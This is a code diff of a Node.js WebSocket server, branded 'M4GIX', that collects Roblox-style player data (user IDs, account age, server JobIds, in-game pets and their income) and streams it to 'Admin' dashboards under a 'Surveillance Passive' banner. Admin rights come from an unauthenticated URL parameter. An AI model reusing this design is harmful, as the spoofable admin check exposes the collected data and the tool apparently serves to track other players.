@@ -6,118 +6,140 @@ const http = require('http');
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
-const mongoURI = process.env.MONGO_URI;
 
-mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
-  .then(() => console.log("✅ MongoDB Connecté"))
-  .catch(err => console.error("❌ Erreur MongoDB :", err));
+// Connexion MongoDB
+mongoose.connect(process.env.MONGO_URI)
+  .then(() => console.log("✅ [DB] MongoDB Connecté avec succès"))
+  .catch(err => console.error("❌ [DB] Erreur de connexion :", err));
 
-const BrainrotSchema = new mongoose.Schema({
-    uid: { type: String, unique: true },
-    ownerName: String,
-    ownerDisplayName: String,
-    ownerId: Number, 
-    userType: String,
-    jobId: String,
+const ClientSchema = new mongoose.Schema({
+    userId: { type: Number, unique: true },
     name: String,
-    income: Number,
-    incomeStr: String,
-    rarity: String,
-    mutation: String,
-    traits: Array,
-    server: { 
-        playerCount: Number, 
-        maxPlayers: Number, 
-        isPrivate: Boolean 
-    },
+    displayName: String,
+    accountAge: Number,
+    jobId: String,
+    server: mongoose.Schema.Types.Mixed,
+    animals: mongoose.Schema.Types.Mixed, 
+    isConnected: { type: Boolean, default: false },
     updatedAt: { type: Date, default: Date.now }
-});
+}, { strict: false });
 
-const Brainrot = mongoose.model('Brainrot', BrainrotSchema);
+const ClientModel = mongoose.model('Client', ClientSchema);
 
-const serverOccupancy = new Map();
-const socketToJob = new Map();
-
+// Fonction de Broadcast
 async function broadcastToAdmins() {
     try {
-        const allData = await Brainrot.find().sort({ income: -1 });
-        const payload = JSON.stringify({ type: 'REFRESH', data: allData });
+        const allClients = await ClientModel.find().sort({ updatedAt: -1 });
+        const payload = JSON.stringify({ type: 'REFRESH', data: allClients });
+        let adminCount = 0;
+
         wss.clients.forEach(client => {
-            if (client.readyState === WebSocket.OPEN && client.isAdmin) client.send(payload);
+            if (client.readyState === WebSocket.OPEN && client.isAdmin) {
+                client.send(payload);
+                adminCount++;
+            }
         });
-    } catch (e) { console.error(e); }
+        if (adminCount > 0) console.log(`📢 [BROADCAST] Données envoyées à ${adminCount} admin(s)`);
+    } catch (e) { console.error("❌ [BROADCAST] Erreur :", e); }
+}
+
+async function updateStatus(userName, status) {
+    if (!userName || userName === 'Inconnu') return;
+    await ClientModel.updateOne({ name: userName }, { isConnected: status });
+    console.log(`📡 [STATUT] ${userName} est maintenant ${status ? "EN LIGNE" : "HORS LIGNE"}`);
+    broadcastToAdmins();
 }
 
 wss.on('connection', (ws, req) => {
     const params = new URLSearchParams(req.url.split('?')[1]);
-    ws.isAdmin = (params.get('role') === 'Admin');
+    const role = params.get('role');
+    const userName = params.get('user') || 'Inconnu';
+    
+    ws.isAdmin = (role === 'Admin');
+    ws.userName = userName;
+    ws.isAlive = true;
 
-    if (ws.isAdmin) broadcastToAdmins();
+    console.log(`\n✨ [NEW_CONN] ${ws.isAdmin ? "🚩 ADMIN" : "👤 CLIENT"} : ${userName}`);
+
+    if (ws.isAdmin) {
+        broadcastToAdmins();
+    } else {
+        updateStatus(userName, true);
+    }
 
     ws.on('message', async (message) => {
+        ws.isAlive = true; // Signal de vie reçu
+
         try {
             const payload = JSON.parse(message);
             if (payload.Method === "ClientInfos") {
                 const d = payload.Data;
-                const jobId = d.Server.JobId;
 
-                // LOG DE RÉCEPTION
-                console.log(`📥 Reçu : ${d.Name} | Serveur: ${jobId.substring(0,6)} | Animaux: ${d.Animals.length}`);
+                // Calcul rapide pour le log
+                const totalIncome = d.Animals.reduce((acc, a) => acc + (a.Income || 0), 0);
+                
+                console.log(`📥 [DATA] Reçu de ${d.Name} | Pets: ${d.Animals.length} | Total: ${totalIncome.toLocaleString()}/s`);
 
-                if (!socketToJob.has(ws)) {
-                    socketToJob.set(ws, jobId);
-                    serverOccupancy.set(jobId, (serverOccupancy.get(jobId) || 0) + 1);
-                }
-
-                for (let a of d.Animals) {
-                    const traitsKey = a.Traits ? a.Traits.sort().join('-') : 'none';
-                    const uid = `${d.Name}_${a.Name}_${a.Mutation}_${a.Income}_${traitsKey}`;
-
-                    await Brainrot.findOneAndUpdate(
-                        { uid: uid },
-                        {
-                            uid,
-                            ownerName: d.Name,
-                            ownerDisplayName: d.DisplayName,
-                            ownerId: d.UserId,
-                            userType: d.UserType,
-                            jobId: d.Server.JobId,
-                            name: a.Name,
-                            income: a.Income,
-                            incomeStr: a.IncomeStr,
-                            rarity: a.Rarity,
-                            mutation: a.Mutation,
-                            traits: a.Traits,
-                            server: {
-                                playerCount: d.Server.PlayerCount,
-                                maxPlayers: d.Server.MaxPlayers,
-                                isPrivate: d.Server.IsPrivate
-                            },
-                            updatedAt: new Date() // Reset du timer de 20 min
-                        },
-                        { upsert: true }
-                    );
-                }
+                await ClientModel.findOneAndUpdate(
+                    { userId: d.UserId },
+                    {
+                        name: d.Name,
+                        displayName: d.DisplayName,
+                        accountAge: d.AccountAge,
+                        jobId: d.Server.JobId,
+                        server: d.Server,
+                        animals: d.Animals,
+                        isConnected: true,
+                        updatedAt: new Date()
+                    },
+                    { upsert: true }
+                );
                 broadcastToAdmins();
             }
-        } catch (e) {
-            console.error("❌ Erreur traitement message:", e);
+        } catch (e) { 
+            console.error(`⚠️ [MESSAGE_ERR] Erreur de parsing de ${ws.userName}:`, e.message); 
         }
     });
 
-    ws.on('close', async () => {
-        const jobId = socketToJob.get(ws);
-        if (jobId) {
-            const count = (serverOccupancy.get(jobId) || 1) - 1;
-            if (count <= 0) {
-                await Brainrot.deleteMany({ jobId: jobId });
-                serverOccupancy.delete(jobId);
-            } else { serverOccupancy.set(jobId, count); }
-            socketToJob.delete(ws);
-            broadcastToAdmins();
+    ws.on('close', () => {
+        console.log(`🔌 [DISCONNECT] ${ws.userName} a fermé la connexion.`);
+        if (!ws.isAdmin) {
+            updateStatus(ws.userName, false);
         }
+    });
+
+    ws.on('error', (err) => {
+        console.error(`💥 [SOCKET_ERR] Erreur sur le socket de ${ws.userName}:`, err);
     });
 });
 
+// SURVEILLANCE PASSIVE
+const interval = setInterval(() => {
+    const now = new Date().toLocaleTimeString();
+    console.log(`\n🔍 [HEARTBEAT_CHECK] ${now} - Vérification de l'activité des clients...`);
+
+    wss.clients.forEach((ws) => {
+        if (ws.isAdmin) return;
+
+        if (ws.isAlive === false) {
+            console.log(`💀 [TIMEOUT] Aucune activité de ${ws.userName} depuis 60s. Terminaison.`);
+            return ws.terminate();
+        }
+
+        // On réinitialise pour le prochain cycle
+        ws.isAlive = false; 
+    });
+}, 60000);
+
 app.use(express.static('public'));
-server.listen(process.env.PORT || 3000);
+
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`
+=========================================
+🚀 SERVEUR M4GIX DÉMARRÉ SUR LE PORT ${PORT}
+📅 Date : ${new Date().toLocaleString()}
+🛡️ Mode : Zéro Filtrage / Surveillance Passive
+=========================================
+    `);
+});
